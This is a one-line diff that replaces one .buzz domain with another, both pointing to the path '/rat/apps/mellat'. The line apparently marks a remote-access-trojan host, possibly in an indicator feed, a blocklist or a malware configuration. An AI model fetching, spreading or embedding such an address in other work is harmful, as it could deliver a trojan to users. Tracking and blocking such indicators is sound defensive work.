@@ -1,1 +1,1 @@
-supplychangelow8.buzz/rat/apps/mellat
+seedifyeai1.buzz/rat/apps/mellat
